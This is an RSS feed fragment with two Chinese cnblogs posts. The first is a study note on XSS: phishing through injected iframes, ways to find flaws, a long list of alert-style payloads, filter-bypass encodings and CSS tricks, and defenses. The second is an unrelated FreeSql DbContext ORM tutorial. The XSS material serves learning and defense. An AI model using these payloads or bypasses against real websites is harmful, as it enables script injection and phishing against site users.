&lt;p&gt;       现在一般我们都可以很容易的防范钓鱼网站，可是当钓鱼网站与XSS漏洞结合呢？设想一下，如mail.qq.com的页面存在XSS漏洞，攻击者通过iframe替换了原来的页面成钓鱼页面，并且网页的Url还是原来的页面，你是否能察觉出来？&lt;/p&gt;
&lt;h4 id=&quot;xss重定向钓鱼&quot;&gt;XSS重定向钓鱼&lt;/h4&gt;
&lt;p&gt;       即从&lt;code&gt;www.a.com&lt;/code&gt;通过xss漏洞跳转到&lt;code&gt;www.b.com&lt;/code&gt;的钓鱼页面上，整个过程变化明显，受害者易察觉。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://www.a.com/index.php?search=&amp;lt;script&amp;gt;document.location.href=&quot;http://www.b.com/index.php&quot;&amp;lt;/script&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;html注入式钓鱼&quot;&gt;HTML注入式钓鱼&lt;/h4&gt;
&lt;p&gt;       通过javascript来修改页面的DOM对象属性，或在原页面中添加新的DOM元素。前者相对于后者更隐蔽。&lt;/p&gt;
&lt;h4 id=&quot;iframe&quot;&gt;Iframe&lt;/h4&gt;
&lt;p&gt;       攻击者通过javascript来添加一个新的&lt;code&gt;&amp;lt;Iframe&amp;gt;&lt;/code&gt;标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。&lt;/p&gt;
&lt;h2 id=&quot;xss漏洞的挖掘&quot;&gt;5) XSS漏洞的挖掘&lt;/h2&gt;
&lt;p&gt;       就目前而言，XSS漏洞的挖掘主要分为白盒审计和黑盒Fuzz两种。&lt;/p&gt;
&lt;h3 id=&quot;白盒审计&quot;&gt;白盒审计&lt;/h3&gt;
&lt;p&gt;       通过查看源代码来判断网站的交互点是否存在安全过滤。由于此处涉及代码审计内容(其实就是懒)，就细说，这里直接引用书中总结的。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;分析源代码挖掘XSS的一般思路是：查找可能在页面输出的变量，检验它们是否受到控制，然后跟踪这些变量的传递过程，分析它们是否被htmlencode()之类的函数过滤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;黑盒审计&quot;&gt;黑盒审计&lt;/h3&gt;
&lt;p&gt;       这个可得好好说说了，毕竟我们在现实环境中挖掘XSS漏洞时黑盒的情况偏多。我们进行XSS黑盒测试时主要分为手工检测和工具检测。&lt;/p&gt;
&lt;h4 id=&quot;手工检测&quot;&gt;手工检测&lt;/h4&gt;
&lt;p&gt;       首先我们需要尽可能地找到目标的每个输入输出点并挨个尝试；在进行尝试的时候，我们应优先选择特殊字符进行测试，如&lt;code&gt;&quot;&amp;lt;&amp;gt;&amp;amp;;/':&lt;/code&gt;等，如果连&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;都未过滤/转义，那么该输入点很可能存在XSS漏洞。&lt;br/&gt;       如果&lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt;等标记符号都被过滤/转义了，我们也可以使用标签自身的属性/事件(href,lowsrc,bgsound,backgroud,value,action,dynsrc等)来触发XSS,如&lt;br/&gt;&lt;code&gt;&amp;lt;input name=&quot;xx&quot; value=&amp;lt;?=$query?&amp;gt;&amp;gt;&lt;/code&gt;这里的$query属于动态内容，我们把他替换成恶意代码，最终的代码为&lt;code&gt;&amp;lt;input name=&quot;xx&quot; value=xss onmouseover=evil_script&amp;gt;&lt;/code&gt;。&lt;br/&gt;       一般来说，针对输入框的黑盒测试可能存在反射型XSS，也可能存在存储型XSS，还有可能是DOM型，针对Url参数的黑盒测试绝大多数只存在反射型XSS或DOM型XSS。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;常见标签
&amp;lt;img&amp;gt;标签
利用方式1
&amp;lt;img src=javascript:alert(&quot;xss&quot;)&amp;gt;
&amp;lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&amp;gt;
&amp;lt;img scr=&quot;URL&quot; style='Xss:expression(alert(/xss));'
&amp;lt;!--CSS标记xss--&amp;gt;
&amp;lt;img STYLE=&quot;background-image:url(javascript:alert('XSS'))&quot;&amp;gt;
XSS利用方式2
&amp;lt;img src=&quot;x&quot; onerror=alert(1)&amp;gt;
&amp;lt;img src=&quot;1&quot; onerror=eval(&quot;alert('xss')&quot;)&amp;gt;
XSS利用方式3
&amp;lt;img src=1 onmouseover=alert('xss')&amp;gt;
&amp;lt;a&amp;gt;标签
标准格式
&amp;lt;a href=&quot;https://www.baidu.com&quot;&amp;gt;baidu&amp;lt;/a&amp;gt;
XSS利用方式1
&amp;lt;a href=&quot;javascript:alert('xss')&quot;&amp;gt;aa&amp;lt;/a&amp;gt;
&amp;lt;a href=javascript:eval(alert('xss'))&amp;gt;aa&amp;lt;/a&amp;gt;
&amp;lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&amp;gt;aa&amp;lt;/a&amp;gt;
XSS利用方式2
&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
&amp;lt;a href=&quot;&quot; onclick=alert('xss')&amp;gt;aa&amp;lt;/a&amp;gt;
利用方式3
&amp;lt;a href=&quot;&quot; onclick=eval(alert('xss'))&amp;gt;aa&amp;lt;/a&amp;gt;
利用方式4
&amp;lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&amp;gt;aa&amp;lt;/a&amp;gt;
input标签
标准格式
&amp;lt;input name=&quot;name&quot; value=&quot;&quot;&amp;gt;
利用方式1
&amp;lt;input value=&quot;&quot; onclick=alert('xss') type=&quot;text&quot;&amp;gt;
利用方式2
&amp;lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt('xss') bad=&quot;&quot;&amp;gt;
利用方式4
&amp;lt;input name=&quot;name&quot; value=&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;
&amp;lt;form&amp;gt;标签
XSS利用方式1
&amp;lt;form action=javascript:alert('xss') method=&quot;get&quot;&amp;gt;
&amp;lt;form action=javascript:alert('xss')&amp;gt;
XSS利用方式2
&amp;lt;form method=post action=aa.asp? onmouseover=prompt('xss')&amp;gt;
&amp;lt;form method=post action=aa.asp? onmouseover=alert('xss')&amp;gt;
&amp;lt;form action=1 onmouseover=alert('xss)&amp;gt;
XSS利用方式3
&amp;lt;!--原code--&amp;gt;
&amp;lt;form method=post action=&quot;data:text/html;base64,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&amp;gt;
&amp;lt;!--base64编码--&amp;gt;
&amp;lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;
&amp;lt;iframe&amp;gt;标签
XSS利用方式1
&amp;lt;iframe src=javascript:alert('xss');height=5width=1000 /&amp;gt;&amp;lt;iframe&amp;gt;
XSS利用方式2
&amp;lt;iframe src=&quot;data:text/html,&amp;amp;lt;script&amp;amp;gt;alert('xss')&amp;amp;lt;/script&amp;amp;gt;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&amp;lt;!--原code--&amp;gt;
&amp;lt;iframe src=&quot;data:text/html;base64,&amp;lt;script&amp;gt;alert('xss')&amp;lt;/script&amp;gt;&quot;&amp;gt;
&amp;lt;!--base64编码--&amp;gt;
&amp;lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;
XSS利用方式3
&amp;lt;iframe src=&quot;aaa&quot; onmouseover=alert('xss') /&amp;gt;&amp;lt;iframe&amp;gt;
XSS利用方式3
&amp;lt;iframe src=&quot;javascript&amp;amp;colon;prompt&amp;amp;lpar;`xss`&amp;amp;rpar;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
svg&amp;lt;&amp;gt;标签
&amp;lt;svg onload=alert(1)&amp;gt;
iframe
&amp;lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;——引自&lt;strong&gt;wkend&lt;/strong&gt;的文章&lt;a href=&quot;https://xz.aliyun.com/t/2936&quot;&gt;《XSS小节》&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;工具检测&quot;&gt;工具检测&lt;/h4&gt;
&lt;p&gt;       关于XSS的自动检测软件有许多，如Burp的Scan模块，&lt;a href=&quot;https://github.com/rajeshmajumdar/BruteXSS&quot;&gt;BruteXSS&lt;/a&gt;等，这里不做过多解释。&lt;/p&gt;
&lt;h2 id=&quot;shellcode的绕过&quot;&gt;6) shellcode的绕过&lt;/h2&gt;
&lt;h3 id=&quot;绕过xss-filter&quot;&gt;绕过XSS-Filter&lt;/h3&gt;
&lt;p&gt;       XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。&lt;/p&gt;
&lt;h4 id=&quot;空格回车和tab&quot;&gt;空格回车和Tab&lt;/h4&gt;
&lt;p&gt;       对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将&lt;code&gt;;&lt;/code&gt;作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到&lt;code&gt;;&lt;/code&gt;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字&lt;code&gt;javascript|alert&lt;/code&gt;的过滤：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;img src=javasc
ript:aler
t(/xss/)&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/03/10/5c83f56052a54.png&quot; alt=&quot;IE6下测试成功&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;对标签属性值进行转码&quot;&gt;对标签属性值进行转码&lt;/h4&gt;
&lt;p&gt;       HTML中属性值支持ASCII码形式，如&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;img src=&quot;javascript:alert('xss');&quot;&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       替换成&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;img src=&quot;javascrip&amp;amp;#116&amp;amp;#58alert('xss');&quot;&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       其中在ASCII表中116为&lt;code&gt;t&lt;/code&gt;，58为&lt;code&gt;:&lt;/code&gt;。&lt;br/&gt;       也可以将&lt;code&gt;&amp;amp;#01&lt;/code&gt;,&lt;code&gt;&amp;amp;#02&lt;/code&gt;等插入javascript的头部，还可以将tab(&amp;amp;#09)|换行符(&amp;amp;#10)|回车键(&amp;amp;#13)插入到代码中的任意位置。&lt;/p&gt;
&lt;h4 id=&quot;fuzz标签未过滤事件名&quot;&gt;Fuzz标签未过滤事件名&lt;/h4&gt;
&lt;p&gt;       如&lt;code&gt;&amp;lt;img src=x onerror=alert(/xss/)&amp;gt;&lt;/code&gt;其中的onerror即为IMG标签的一个事件，通常这样的事件都是以&lt;code&gt;on&lt;/code&gt;开头，常见的有:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;onResume
onReverse
onSeek
onSynchRestored
onURLFlip
onRepeat
onPause
onstop
onmouseover&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       除此之外还有很多事件可以利用，这里不再一一列举。&lt;/p&gt;
&lt;h4 id=&quot;使用css绕过&quot;&gt;使用Css绕过&lt;/h4&gt;
&lt;p&gt;       利用Css样式表可以执行javascript的特性，如&lt;br/&gt;       Css直接执行javascript：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;div style=&quot;background-image:url(javascript:alert('xss'))&quot;&amp;gt;
&amp;lt;style&amp;gt;
    body {background-image:url(&quot;javascript:alert('xss')&quot;);}
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       css中使用expression执行javascript:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;div style=&quot;width: expression(alert('xss'))&quot;&amp;gt;
&amp;lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&amp;gt;
&amp;lt;style&amp;gt;
    body {background-image:expression(&quot;alert('xss')&quot;);}
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。&lt;br/&gt;       除了上述两种，还可以利用@import直接执行javascript代码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;style&amp;gt;
    @import 'javascript:alert(&quot;xss&quot;)';
&amp;lt;/style&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;       在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。&lt;/p&gt;
&lt;h3 id=&quot;扰乱规则&quot;&gt;扰乱规则&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;大小写变换;&lt;/li&gt;
&lt;li&gt;利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;&lt;/li&gt;
&lt;li&gt;结合样式表注释字符/**/，通过css执行javascript&lt;/li&gt;
&lt;li&gt;样式标签会过滤&lt;code&gt;\&lt;/code&gt;和&lt;code&gt;\0&lt;/code&gt;，可以构造如&lt;code&gt;@i\mp\0\0ort 'jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)'&lt;/code&gt;绕过&lt;/li&gt;
&lt;li&gt;Css关键字进行编码处理，如&lt;code&gt;&amp;lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&amp;gt;&lt;/code&gt;其中65为字母e进行unicode编码后的数字部分&lt;/li&gt;
&lt;li&gt;利用浏览器解析注释的问题&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;利用字符编码&quot;&gt;利用字符编码&lt;/h3&gt;
&lt;p&gt;       javascript支持许多的编码格式，如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;unicode&lt;/li&gt;
&lt;li&gt;escapes&lt;/li&gt;
&lt;li&gt;十六|十|八进制&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力&lt;/strong&gt;&lt;br/&gt;在IE下甚至支持JScript Encode加密后的代码&lt;/p&gt;
&lt;h3 id=&quot;拆分法&quot;&gt;拆分法&lt;/h3&gt;
&lt;p&gt;       如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：&lt;a href=&quot;http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm&quot;&gt;《疯狂的跨站之行》剑心(非原链接)&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;xss防御&quot;&gt;7) XSS防御&lt;/h2&gt;
&lt;p&gt;       说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？&lt;/p&gt;
&lt;h3 id=&quot;输入&quot;&gt;输入&lt;/h3&gt;
&lt;p&gt;       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。&lt;/p&gt;
&lt;h3 id=&quot;输出&quot;&gt;输出&lt;/h3&gt;
&lt;p&gt;       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。&lt;/p&gt;
&lt;h3 id=&quot;其他&quot;&gt;其他&lt;/h3&gt;
&lt;p&gt;       设置HttpOnly，开启WAF。&lt;/p&gt;

&lt;p&gt;       感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注&lt;a href=&quot;http://www.cnblogs.com/yunen/p/www.0x002.com&quot;&gt;我的博客&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;br/&gt;书籍：&lt;br/&gt;《Web前端黑客技术揭秘》&lt;br/&gt;《XSS跨站脚本攻击剖析与防御》&lt;br/&gt;《白帽子讲Web安全》&lt;br/&gt;《黑客攻防技术宝典Web实战篇》第二版&lt;br/&gt;文章：&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2936&quot;&gt;XSS小结&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://github.com/dwqs/blog/issues/68&quot;&gt;浅说 XSS 和 CSRF&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://blog.csdn.net/h_mxc/article/details/50542038&quot;&gt;Session攻击手段(会话劫持/固定)及其安全防御措施&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md 2017灰袍技能精华&lt;br/&gt;https://github.com/rajeshmajumdar/BruteXSS BruteXSS&lt;br/&gt;https://github.com/beefproject/beef Beef神器&lt;br/&gt;https://github.com/1N3/XSSTracer 用于检查跨站点跟踪的小型python脚本&lt;br/&gt;https://github.com/0x584A/fuzzXssPHP 一个非常简单的反射XSS扫描仪支持GET/POST&lt;br/&gt;https://github.com/chuhades/xss_scan 反射xss扫描器&lt;br/&gt;https://github.com/BlackHole1/autoFindXssAndCsrf 浏览器的插件，它自动检查页面是否具有xss和漏洞&lt;br/&gt;https://github.com/shogunlab/shuriken xss命令行工具用于测试web应用程序中xss负载列表&lt;br/&gt;https://github.com/UltimateHackers/XSStrike 用于XSS、WAF检测和旁路的模糊和蛮力参数&lt;br/&gt;https://github.com/stamparm/DSXS 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 14:05:00 +0000</pubDate>
<dc:creator>Yunen的博客</dc:creator>
<og:description>简单概述 &amp; 160; &amp; 160; &amp; 160; &amp; 160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yunen/p/10581320.html</dc:identifier>
</item>
<item>
<title>跟踪测试 DbContext ，向＂不是真正的 ORM＂ 说拜拜 - nicye</title>
<link>http://www.cnblogs.com/kellynic/p/10580936.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kellynic/p/10580936.html</guid>
<description>&lt;p&gt;FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。&lt;/p&gt;
&lt;h2 id=&quot;方法一基于-helper-的方式祼用&quot;&gt;方法一：基于 helper 的方式，祼用；&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;dotnet add package FreeSql&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;提供 CodeFirst、DbFirst、丰富的表达式树、读写分离、AOP等功能支持；&lt;/p&gt;
&lt;h2 id=&quot;方法二基于-repository-unitofwok-的方式&quot;&gt;方法二：基于 Repository + UnitOfWok 的方式；&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;dotnet add package FreeSql.Repository&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是一个扩展包，提供标准的 IRepository 接口定义与默认实现，以及 UnitOfWork 工作单元的支持，更可怕的是集成了局部/全局过滤器，实现租户、软删除等功能不在话下。&lt;/p&gt;
&lt;p&gt;不相信吗？请看以下代码：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public IServiceProvider ConfigureServices(IServiceCollection services) {
    services.AddSingleton&amp;lt;IFreeSql&amp;gt;(fsql);
    services.AddMvc();

    var builder = new ContainerBuilder();

    builder.RegisterFreeRepository(filter =&amp;gt; filter
        .Apply&amp;lt;ISoftDelete&amp;gt;(&quot;SoftDelete&quot;, a =&amp;gt; a.IsDeleted == false)
        .Apply&amp;lt;ITenant&amp;gt;(&quot;Tenant&quot;, a =&amp;gt; a.TenantId == 1)
    );

    builder.Populate(services);
    var container = builder.Build();
    return new AutofacServiceProvider(container);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;比 abpvnext 还要方便，因为 abp 的相关实体需要实现接口 ISoftDelete、ITenant；&lt;/p&gt;
&lt;p&gt;我们没有这个限制，只要过滤器的表达式解析成功，就算可用；&lt;/p&gt;
&lt;p&gt;使用在任何实体上的时候，只要 [实体].IsDeleted == false 能解析能过，就算可用；&lt;/p&gt;

&lt;p&gt;这个项目仍然是一个扩展包，提类似 EFCore 那样的开发习惯。目前定义的规则如下：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;文字规则略显复杂，后边有代码演示，以及图文介绍在 sqlite 和 sqlserver 下的测试过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;dbcontext&quot;&gt;DbContext&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;提供 SaveChanges 方法；&lt;/li&gt;
&lt;li&gt;执行队列；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;dbset&quot;&gt;DbSet&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;提供 Add、AddRange、Remove、RemoveRange、Update、UpdateRange 方法；&lt;/li&gt;
&lt;li&gt;以及 Select 属性（连去原有的 FreeSql 查询对象）；&lt;/li&gt;
&lt;li&gt;私有对象 states，存储实体的副本哈希集合，key=实体的主键值，value=实体；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;addaddrangeentitys&quot;&gt;Add/AddRange(entitys)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，是否存在于 states 中，存在时报错；&lt;/li&gt;
&lt;li&gt;验证 entitys 主键中存在自增：
&lt;ul&gt;&lt;li&gt;若有，则立即开启 DbContext 事务，按数据库种类执行相应的方法，最终将返回的自增值，赋给entitys的属性；&lt;/li&gt;
&lt;li&gt;若无，并且 entitys 无主键值，则报错；&lt;/li&gt;
&lt;li&gt;否则，进入【打包执行队列】；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;完成时更新 states；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;removeremoverangeentitys&quot;&gt;Remove/RemoveRange(entitys)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，若无则报错；&lt;/li&gt;
&lt;li&gt;验证 states 中是否存在，若无则提醒应该先查询，再删除；&lt;/li&gt;
&lt;li&gt;删除 states 对应的实体；&lt;/li&gt;
&lt;li&gt;清除 entitys 内的自增属性值、Guid 类型的值，那这个 entitys 将变为可 Add 状态；&lt;/li&gt;
&lt;li&gt;进入【打包执行队列】；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;updateupdaterangeentitys&quot;&gt;Update/UpdateRange(entitys)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，若无则报错；&lt;/li&gt;
&lt;li&gt;验证 states 中是否存在，若无则提醒应该先查询，再删除；&lt;/li&gt;
&lt;li&gt;进入【打包执行队列】；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;select&quot;&gt;Select&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;立即执行队列中的命令（打包方式），以免脏读到未提交的数据；&lt;/li&gt;
&lt;li&gt;查询完成时，更新 states 的值；&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;更新数据规则&quot;&gt;更新数据规则&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;对比 states 中存在的历史快照值，返回即将修改的 fields；&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;using FreeSql;

public class SongContext : DbContext {

    public DbSet&amp;lt;Song&amp;gt; Songs { get; set; }
    public DbSet&amp;lt;Tag&amp;gt; Tags { get; set; }

    protected override void OnConfiguring(DbContextOptionsBuilder builder) {
        builder.UseFreeSql(这里是IFreeeSql对象);
    }
}

public class Song {
    [Column(IsIdentity = true)]
    public int Id { get; set; }
    public DateTime? Create_time { get; set; }
    public bool? Is_deleted { get; set; }
    public string Title { get; set; }
    public string Url { get; set; }
}
public class Tag {
    [Column(IsIdentity = true)]
    public int Id { get; set; }
    public string Name { get; set; }
}

using (var ctx = new SongContext()) {

    ctx.Songs.Select.Where(a =&amp;gt; a.Id &amp;gt; 10).ToList();
    //查询结果，存入 states

    var song = new Song { };
    //可插入的 song

    ctx.Songs.Add(song);
    id = song.Id;
    //因有自增类型，立即开启事务执行SQL，返回自增值

    var adds = Enumerable.Range(0, 100)
        .Select(a =&amp;gt; new Song { Create_time = DateTime.Now, Is_deleted = false, Title = &quot;xxxx&quot; + a, Url = &quot;url222&quot; })
        .ToList();
    //创建一堆无主键值的数据

    ctx.Songs.AddRange(adds);
    //立即执行，将自增值赋给 adds 所有元素，因为有自增类型，如果其他类型，指定传入主键值，不会立即执行

    for (var a = 0; a &amp;lt; adds.Count; a++)
        adds[a].Title = &quot;dkdkdkdk&quot; + a;

    ctx.Songs.UpdateRange(adds);
    //批量修改，进入队列

    ctx.Songs.RemoveRange(adds.Skip(10).Take(20).ToList());
    //批量删除，进入队列，完成时 10-20 元素的主键值会被清除

    //ctx.Songs.Update(adds.First());

    adds.Last().Url = &quot;skldfjlksdjglkjjcccc&quot;;
    ctx.Songs.Update(adds.Last());
    //单条修改 urls 的值，进入队列

    //throw new Exception(&quot;回滚&quot;);

    //ctx.Songs.Select.First();
    //这里做一个查询，会立即打包【执行队列】，避免没有提交的数据，影响查询结果

    ctx.SaveChanges();
    //打包【执行队列】，提交事务
}&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202503725-1998910232.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202625566-1608088349.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202901970-1702592454.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打个岔：为什么一条条的执行？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有自增属性需要获取值；&lt;/li&gt;
&lt;li&gt;sqlite 没有批量插入获取多个自增的办法，或者您有招来支一支(万分感谢)；&lt;/li&gt;
&lt;li&gt;后面采用 sqlserver 测试，就不是这个境况了，insert into values(),(),()，然后利用 output 特性返回所有值；
&lt;ul&gt;&lt;li&gt;比较蛋疼的是，这个特性不是所有数据库都有&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322203314837-1972352220.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322203514389-958794814.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看见，最终 SaveChanges 时将不会产生影响的命令，一起打包执行，即采用优化合并的方式进行执行。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;ctx.Songs.Update(adds[0]);
ctx.Songs.Update(adds[1]);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这两个更新操作，会合成一条 SQL 命令执行。&lt;/p&gt;

&lt;p&gt;其实大致与 sqlite 下相同，唯一的区别在于 AddRange 的处理方式，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322204114268-1554751503.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当插入单条时，采用了第一行代码的 SQL 命令；&lt;/p&gt;
&lt;p&gt;当批量插入时，采用了后面看上去复杂的 SQL 命令；&lt;/p&gt;
&lt;p&gt;所有传入的实体属性值在执行完成后，都会更新；&lt;/p&gt;
&lt;h2 id=&quot;特别说明&quot;&gt;特别说明&lt;/h2&gt;
&lt;p&gt;FreeSql.DbContext 目前仍处于研究开发阶段，不适合商用；&lt;/p&gt;

&lt;p&gt;为什么写这篇文章，时常看见有人说某某 orm 不是真正的 orm，没有 OO 思想。&lt;/p&gt;
&lt;p&gt;希望 FreeSql.DbContext 随着时间的积累，稳定性和成熟度有所提升，不久成为一个真正的 ORM。&lt;/p&gt;
&lt;p&gt;有人会担心，我们第三方做的不靠谱，没有 EFCore 稳定的说话，这个是当然。&lt;/p&gt;
&lt;p&gt;但是我们也有自己的特点，不是吗？我们可以做到多种数据库使用习惯的一致性，这点 EFCore 目前是没有办法解决的难题。&lt;/p&gt;
&lt;p&gt;从细节出发，我们的口号是：做 .NETCore 最方便的 ORM！&lt;/p&gt;
